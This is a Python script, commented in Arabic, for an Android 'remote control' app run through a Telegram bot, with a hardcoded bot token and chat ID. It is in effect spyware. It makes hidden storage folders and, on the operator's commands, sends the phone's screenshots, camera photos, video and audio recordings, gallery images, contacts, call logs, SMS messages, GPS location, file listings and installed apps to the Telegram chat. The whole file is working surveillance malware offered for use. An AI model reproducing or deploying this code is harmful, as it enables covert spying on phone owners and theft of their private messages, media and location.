"""
تطبيق تحكم عن بعد للهاتف - Android APK
بوت تليجرام متكامل للتحكم بالجهاز
"""

import os
import json
import time
import threading
import requests
from datetime import datetime
import subprocess

# ============================================
# ضع التوكن ومعرف الدردشة هنا
# ============================================
BOT_TOKEN = "8321792439:AAEgbnuakpy3TiWqePzCm1Mc2y2GNlveSGs"
BOT_CHAT_ID = "6494865307"
BOT_ADMIN_ID = BOT_CHAT_ID
# ============================================

# مجلدات التخزين
STORAGE_PATHS = [
    '/sdcard/Android/.system_cache',
    '/sdcard/Android/.screenshots',
    '/sdcard/Android/.recordings',
    '/sdcard/Android/.camera',
    '/sdcard/Android/.files'
]

for path in STORAGE_PATHS:
    if not os.path.exists(path):
        os.makedirs(path, exist_ok=True)

TEMP_DIR = STORAGE_PATHS[0]


class TelegramBot:
    """بوت التحكم عن بعد"""

    def __init__(self):
        self.token = BOT_TOKEN
        self.chat_id = BOT_CHAT_ID
        self.admin_id = BOT_ADMIN_ID
        self.base_url = f"https://api.telegram.org/bot{self.token}"
        self.last_update_id = 0
        self.running = True

    def send_message(self, text, chat_id=None, parse_mode='HTML'):
        """إرسال رسالة نصية"""
        if chat_id is None:
            chat_id = self.chat_id
        try:
            url = f"{self.base_url}/sendMessage"
            data = {
                "chat_id": chat_id,
                "text": text,
                "parse_mode": parse_mode
            }
            requests.post(url, data=data, timeout=10)
            return True
        except:
            return False

    def send_photo(self, photo_path, chat_id=None, caption=''):
        """إرسال صورة"""
        if chat_id is None:
            chat_id = self.chat_id
        try:
            url = f"{self.base_url}/sendPhoto"
            with open(photo_path, 'rb') as photo:
                files = {'photo': photo}
                data = {"chat_id": chat_id, "caption": caption}
                requests.post(url, data=data, files=files, timeout=60)
            return True
        except:
            return False

    def send_video(self, video_path, chat_id=None, caption=''):
        """إرسال فيديو"""
        if chat_id is None:
            chat_id = self.chat_id
        try:
            url = f"{self.base_url}/sendVideo"
            with open(video_path, 'rb') as video:
                files = {'video': video}
                data = {"chat_id": chat_id, "caption": caption}
                requests.post(url, data=data, files=files, timeout=120)
            return True
        except:
            return False

    def send_audio(self, audio_path, chat_id=None, caption=''):
        """إرسال ملف صوتي"""
        if chat_id is None:
            chat_id = self.chat_id
        try:
            url = f"{self.base_url}/sendAudio"
            with open(audio_path, 'rb') as audio:
                files = {'audio': audio}
                data = {"chat_id": chat_id, "caption": caption}
                requests.post(url, data=data, files=files, timeout=120)
            return True
        except:
            return False

    def send_file(self, file_path, chat_id=None, caption=''):
        """إرسال أي ملف"""
        if chat_id is None:
            chat_id = self.chat_id
        try:
            url = f"{self.base_url}/sendDocument"
            with open(file_path, 'rb') as file:
                files = {'document': file}
                data = {"chat_id": chat_id, "caption": caption}
                requests.post(url, data=data, files=files, timeout=120)
            return True
        except:
            return False

    def send_action(self, action, chat_id=None):
        """إرسال حالة البوت"""
        if chat_id is None:
            chat_id = self.chat_id
        try:
            url = f"{self.base_url}/sendChatAction"
            data = {"chat_id": chat_id, "action": action}
            requests.post(url, data=data, timeout=5)
        except:
            pass

    def get_updates(self):
        """جلب التحديثات"""
        try:
            url = f"{self.base_url}/getUpdates"
            params = {
                "offset": self.last_update_id + 1,
                "timeout": 10
            }
            response = requests.get(url, params=params, timeout=15)
            updates = response.json()

            if updates.get("ok"):
                for update in updates.get("result", []):
                    self.last_update_id = update["update_id"]
                    self.process_update(update)
        except:
            pass

    def process_update(self, update):
        """معالجة التحديثات"""
        if "message" in update:
            message = update["message"]
            chat_id = message["chat"]["id"]

            if str(chat_id) == str(self.admin_id):
                if "text" in message:
                    text = message["text"].strip()
                    self.handle_command(text, chat_id)

    def handle_command(self, text, chat_id):
        """معالجة الأوامر"""
        global controller

        # قائمة الأوامر
        commands = {
            '1': controller.take_screenshot,
            '2': controller.take_back_camera,
            '3': controller.take_front_camera,
            '4': controller.record_video,
            '5': controller.record_audio,
            '6': controller.get_photos,
            '7': controller.get_contacts,
            '8': controller.get_call_logs,
            '9': controller.get_sms,
            '10': controller.get_location,
            '11': controller.get_device_info,
            '12': controller.list_files,
            '13': controller.get_public_ip,
            '14': controller.get_installed_apps,
            '0': controller.show_menu
        }

        if text in commands:
            self.send_action("typing", chat_id)
            threading.Thread(target=commands[text], args=(chat_id,), daemon=True).start()
        elif text == "/start":
            controller.show_menu(chat_id)
        elif text == "/help":
            self.send_message(controller.get_help_text(), chat_id)

    def run(self):
        """تشغيل البوت"""
        while self.running:
            try:
                self.get_updates()
                time.sleep(1)
            except:
                time.sleep(5)


class AndroidController:
    """التحكم بهاتف الأندرويد"""

    def __init__(self):
        self.bot = TelegramBot()
        self.running = True
        self.start()

    def start(self):
        """بدء التشغيل"""
        # تشغيل البوت في خلفية
        self.bot_thread = threading.Thread(target=self.bot.run, daemon=True)
        self.bot_thread.start()

        # إرسال رسالة بدء التشغيل
        self.send_startup_message()

    def send_startup_message(self):
        """رسالة بدء التشغيل"""
        try:
            msg = f"""
<b>🚀 نظام التحكم عن بعد جاهز</b>
<b>📱 الجهاز:</b> Android
<b>🕐 الوقت:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

أرسل 0 لعرض القائمة الكاملة
"""
            self.bot.send_message(msg)
        except:
            pass

    def show_menu(self, chat_id):
        """عرض القائمة الرئيسية"""
        menu = f"""
<b>🎮 قائمة التحكم الشامل</b>
<b>📱 الوقت:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

━━━━━━━━━━━━━━━
<b>1️⃣</b> 📸 لقطة شاشة
<b>2️⃣</b> 🎥 كاميرا خلفية
<b>3️⃣</b> 🤳 كاميرا أمامية
<b>4️⃣</b> 🎬 تسجيل فيديو (30ث)
<b>5️⃣</b> 🎤 تسجيل صوت (30ث)
<b>6️⃣</b> 🖼️ سحب الصور
<b>7️⃣</b> 📱 جهات الاتصال
<b>8️⃣</b> 📞 سجل المكالمات
<b>9️⃣</b> 💬 الرسائل النصية
<b>🔟</b> 📍 الموقع الجغرافي
<b>1️⃣1️⃣</b> ℹ️ معلومات الجهاز
<b>1️⃣2️⃣</b> 📁 إدارة الملفات
<b>1️⃣3️⃣</b> 🌐 IP العام
<b>1️⃣4️⃣</b> 📲 التطبيقات المثبتة
<b>0️⃣</b> 🔄 عرض القائمة
━━━━━━━━━━━━━━━
"""
        self.bot.send_message(menu, chat_id)

    # ============================================
    # 1️⃣ لقطة شاشة
    # ============================================
    def take_screenshot(self, chat_id):
        """التقاط شاشة الهاتف"""
        try:
            self.bot.send_action("upload_photo", chat_id)
            self.bot.send_message("📸 جاري التقاط الشاشة...", chat_id)

            filename = f"{TEMP_DIR}/screenshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"

            # محاولة استخدام screencap
            result = subprocess.run(['screencap', '-p', filename],
                                    capture_output=True, timeout=10)

            if os.path.exists(filename):
                self.bot.send_photo(filename, chat_id, "📸 لقطة شاشة")
                os.remove(filename)
                self.bot.send_message("✅ تم التقاط الشاشة", chat_id)
            else:
                self.bot.send_message("❌ فشل التقاط الشاشة", chat_id)
        except:
            self.bot.send_message("❌ يحتاج صلاحيات ROOT", chat_id)

    # ============================================
    # 2️⃣ كاميرا خلفية
    # ============================================
    def take_back_camera(self, chat_id):
        """تصوير بالكاميرا الخلفية"""
        try:
            self.bot.send_action("upload_photo", chat_id)
            self.bot.send_message("📸 جاري التصوير...", chat_id)

            filename = f"{TEMP_DIR}/camera_back_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"

            # محاولة استخدام termux-api
            result = subprocess.run(['termux-camera-photo', '-c', '0', filename],
                                    capture_output=True, timeout=10)

            if os.path.exists(filename):
                self.bot.send_photo(filename, chat_id, "🎥 كاميرا خلفية")
                os.remove(filename)
                self.bot.send_message("✅ تم التصوير", chat_id)
            else:
                self.bot.send_message("❌ فشل التصوير", chat_id)
        except:
            self.bot.send_message("❌ الكاميرا غير متاحة", chat_id)

    # ============================================
    # 3️⃣ كاميرا أمامية
    # ============================================
    def take_front_camera(self, chat_id):
        """تصوير بالكاميرا الأمامية"""
        try:
            self.bot.send_action("upload_photo", chat_id)
            self.bot.send_message("🤳 جاري التصوير...", chat_id)

            filename = f"{TEMP_DIR}/camera_front_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"

            result = subprocess.run(['termux-camera-photo', '-c', '1', filename],
                                    capture_output=True, timeout=10)

            if os.path.exists(filename):
                self.bot.send_photo(filename, chat_id, "🤳 كاميرا أمامية")
                os.remove(filename)
                self.bot.send_message("✅ تم التصوير", chat_id)
            else:
                self.bot.send_message("❌ فشل التصوير", chat_id)
        except:
            self.bot.send_message("❌ الكاميرا الأمامية غير متاحة", chat_id)

    # ============================================
    # 4️⃣ تسجيل فيديو
    # ============================================
    def record_video(self, chat_id, duration=30):
        """تسجيل فيديو"""
        try:
            self.bot.send_action("record_video", chat_id)
            self.bot.send_message(f"🎥 جاري تسجيل فيديو {duration} ثانية...", chat_id)

            filename = f"{TEMP_DIR}/video_{datetime.now().strftime('%Y%m%d_%H%M%S')}.mp4"

            # محاولة استخدام termux-api
            result = subprocess.run(['termux-camera-record', '-c', '0', filename, '-t', str(duration)],
                                    capture_output=True, timeout=duration + 5)

            if os.path.exists(filename):
                self.bot.send_video(filename, chat_id, "🎥 تسجيل فيديو")
                os.remove(filename)
                self.bot.send_message("✅ تم تسجيل الفيديو", chat_id)
            else:
                self.bot.send_message("❌ فشل تسجيل الفيديو", chat_id)
        except:
            self.bot.send_message("❌ الكاميرا غير متاحة للتسجيل", chat_id)

    # ============================================
    # 5️⃣ تسجيل صوت
    # ============================================
    def record_audio(self, chat_id, duration=30):
        """تسجيل صوت"""
        try:
            self.bot.send_action("record_audio", chat_id)
            self.bot.send_message(f"🎤 جاري تسجيل صوت {duration} ثانية...", chat_id)

            filename = f"{TEMP_DIR}/audio_{datetime.now().strftime('%Y%m%d_%H%M%S')}.3gp"

            result = subprocess.run(['termux-microphone-record', '-f', filename, '-l', str(duration)],
                                    capture_output=True, timeout=duration + 5)

            if os.path.exists(filename):
                self.bot.send_audio(filename, chat_id, "🎤 تسجيل صوت")
                os.remove(filename)
                self.bot.send_message("✅ تم تسجيل الصوت", chat_id)
            else:
                self.bot.send_message("❌ فشل تسجيل الصوت", chat_id)
        except:
            self.bot.send_message("❌ الميكروفون غير متاح", chat_id)

    # ============================================
    # 6️⃣ سحب الصور
    # ============================================
    def get_photos(self, chat_id):
        """سحب الصور من المعرض"""
        try:
            self.bot.send_action("upload_photo", chat_id)
            self.bot.send_message("🖼️ جاري البحث عن الصور...", chat_id)

            photos = []
            dcim = '/sdcard/DCIM/Camera'

            if os.path.exists(dcim):
                for file in os.listdir(dcim)[:10]:
                    if file.lower().endswith(('.jpg', '.jpeg', '.png')):
                        photos.append(os.path.join(dcim, file))

            if photos:
                self.bot.send_message(f"✅ تم العثور على {len(photos)} صورة", chat_id)
                for i, photo in enumerate(photos[:5], 1):
                    if os.path.getsize(photo) < 15 * 1024 * 1024:
                        self.bot.send_photo(photo, chat_id, f"🖼️ صورة {i}")
                        time.sleep(2)
            else:
                self.bot.send_message("❌ لا توجد صور", chat_id)
        except:
            self.bot.send_message("❌ فشل سحب الصور", chat_id)

    # ============================================
    # 7️⃣ جهات الاتصال
    # ============================================
    def get_contacts(self, chat_id):
        """سحب جهات الاتصال"""
        try:
            self.bot.send_action("typing", chat_id)

            result = subprocess.run(['termux-contact-list'],
                                    capture_output=True, text=True, timeout=10)

            if result.stdout:
                contacts = json.loads(result.stdout)
                text = "<b>📱 جهات الاتصال:</b>\n\n"
                for i, contact in enumerate(contacts[:50], 1):
                    name = contact.get('name', 'غير معروف')
                    number = contact.get('number', '')
                    text += f"{i}. {name}: {number}\n"
                self.bot.send_message(text[:4000], chat_id)
            else:
                self.bot.send_message("❌ لا توجد جهات اتصال", chat_id)
        except:
            self.bot.send_message("❌ فشل سحب جهات الاتصال", chat_id)

    # ============================================
    # 8️⃣ سجل المكالمات
    # ============================================
    def get_call_logs(self, chat_id):
        """سحب سجل المكالمات"""
        try:
            self.bot.send_action("typing", chat_id)

            result = subprocess.run(['termux-call-log'],
                                    capture_output=True, text=True, timeout=10)

            if result.stdout:
                calls = json.loads(result.stdout)
                text = "<b>📞 سجل المكالمات:</b>\n\n"
                for i, call in enumerate(calls[:30], 1):
                    name = call.get('name', 'غير معروف')
                    number = call.get('number', '')
                    duration = call.get('duration', 0)
                    text += f"{i}. {name}: {number} ({duration} ث)\n"
                self.bot.send_message(text[:4000], chat_id)
            else:
                self.bot.send_message("❌ لا يوجد سجل مكالمات", chat_id)
        except:
            self.bot.send_message("❌ فشل سحب سجل المكالمات", chat_id)

    # ============================================
    # 9️⃣ الرسائل النصية
    # ============================================
    def get_sms(self, chat_id):
        """سحب الرسائل النصية"""
        try:
            self.bot.send_action("typing", chat_id)

            result = subprocess.run(['termux-sms-list', '-l', '30'],
                                    capture_output=True, text=True, timeout=10)

            if result.stdout:
                sms_list = json.loads(result.stdout)
                text = "<b>💬 آخر الرسائل:</b>\n\n"
                for i, sms in enumerate(sms_list[:20], 1):
                    address = sms.get('address', '')
                    body = sms.get('body', '')[:100]
                    text += f"{i}. {address}: {body}...\n"
                self.bot.send_message(text[:4000], chat_id)
            else:
                self.bot.send_message("❌ لا توجد رسائل", chat_id)
        except:
            self.bot.send_message("❌ فشل سحب الرسائل", chat_id)

    # ============================================
    # 🔟 الموقع الجغرافي
    # ============================================
    def get_location(self, chat_id):
        """الحصول على الموقع"""
        try:
            self.bot.send_action("find_location", chat_id)
            self.bot.send_message("📍 جاري تحديد الموقع...", chat_id)

            result = subprocess.run(['termux-location'],
                                    capture_output=True, text=True, timeout=15)

            if result.stdout:
                location = json.loads(result.stdout)
                lat = location.get('latitude', 0)
                lon = location.get('longitude', 0)
                acc = location.get('accuracy', 0)

                maps_link = f"https://www.google.com/maps?q={lat},{lon}"
                text = f"""
<b>📍 الموقع الحالي:</b>

<b>خط العرض:</b> {lat}
<b>خط الطول:</b> {lon}
<b>الدقة:</b> ±{acc} متر

<b>🔗 رابط الخريطة:</b>
{maps_link}
"""
                self.bot.send_message(text, chat_id)
            else:
                self.bot.send_message("❌ فشل الحصول على الموقع", chat_id)
        except:
            self.bot.send_message("❌ GPS غير متاح", chat_id)

    # ============================================
    # 1️⃣1️⃣ معلومات الجهاز
    # ============================================
    def get_device_info(self, chat_id):
        """معلومات الجهاز"""
        try:
            info = f"""
<b>ℹ️ معلومات الجهاز:</b>

<b>📱 الطراز:</b> {os.environ.get('MODEL', 'غير معروف')}
<b>🏭 الشركة:</b> {os.environ.get('MANUFACTURER', 'غير معروف')}
<b>📀 الإصدار:</b> Android {os.environ.get('RELEASE', 'غير معروف')}
<b>🆔 SDK:</b> {os.environ.get('SDK', 'غير معروف')}

<b>💾 التخزين:</b>
• المساحة الكلية: {self.get_storage_total()}
• المساحة المتاحة: {self.get_storage_free()}

<b>🕐 الوقت:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
"""
            self.bot.send_message(info, chat_id)
        except:
            self.bot.send_message("❌ فشل الحصول على معلومات الجهاز", chat_id)

    # ============================================
    # 1️⃣2️⃣ إدارة الملفات
    # ============================================
    def list_files(self, chat_id, path='/sdcard'):
        """عرض الملفات"""
        try:
            if os.path.exists(path):
                files = os.listdir(path)[:20]
                text = f"<b>📁 الملفات في: {path}</b>\n\n"

                for i, file in enumerate(files, 1):
                    full = os.path.join(path, file)
                    if os.path.isdir(full):
                        text += f"📁 {i}. {file}/\n"
                    else:
                        size = os.path.getsize(full) // 1024
                        text += f"📄 {i}. {file} ({size} KB)\n"

                self.bot.send_message(text[:4000], chat_id)
            else:
                self.bot.send_message("❌ المسار غير موجود", chat_id)
        except:
            self.bot.send_message("❌ فشل قراءة الملفات", chat_id)

    # ============================================
    # 1️⃣3️⃣ IP العام
    # ============================================
    def get_public_ip(self, chat_id):
        """الحصول على IP العام"""
        try:
            ip = requests.get('https://api.ipify.org', timeout=10).text
            self.bot.send_message(f"<b>🌐 IP العام:</b> {ip}", chat_id)
        except:
            self.bot.send_message("❌ فشل الحصول على IP", chat_id)

    # ============================================
    # 1️⃣4️⃣ التطبيقات المثبتة
    # ============================================
    def get_installed_apps(self, chat_id):
        """عرض التطبيقات المثبتة"""
        try:
            result = subprocess.run(['pm', 'list', 'packages', '-3'],
                                    capture_output=True, text=True, timeout=10)

            if result.stdout:
                apps = result.stdout.strip().split('\n')
                text = "<b>📲 التطبيقات المثبتة:</b>\n\n"
                for i, app in enumerate(apps[:30], 1):
                    package = app.replace('package:', '')
                    text += f"{i}. {package}\n"
                self.bot.send_message(text[:4000], chat_id)
            else:
                self.bot.send_message("❌ لا توجد تطبيقات", chat_id)
        except:
            self.bot.send_message("❌ فشل قراءة التطبيقات", chat_id)

    # ============================================
    # دوال مساعدة
    # ============================================
    def get_storage_total(self):
        try:
            stat = os.statvfs('/sdcard')
            total = stat.f_blocks * stat.f_frsize / (1024 ** 3)
            return f"{total:.1f} GB"
        except:
            return "غير معروف"

    def get_storage_free(self):
        try:
            stat = os.statvfs('/sdcard')
            free = stat.f_bavail * stat.f_frsize / (1024 ** 3)
            return f"{free:.1f} GB"
        except:
            return "غير معروف"

    def get_help_text(self):
        """نص المساعدة"""
        return """
<b>🤖 مساعدة البوت:</b>

📌 <b>الأوامر المتاحة:</b>
• 1-14: أرقام للتحكم
• /start: بدء التشغيل
• /help: عرض المساعدة

⚠️ <b>ملاحظة:</b>
يحتاج تطبيق Termux:API مثبت على الجهاز
"""


# ============================================
# تشغيل التطبيق
# ============================================
controller = None

if __name__ == "__main__":
    controller = AndroidController()

    # منع إغلاق التطبيق
    while True:
        time.sleep(60)
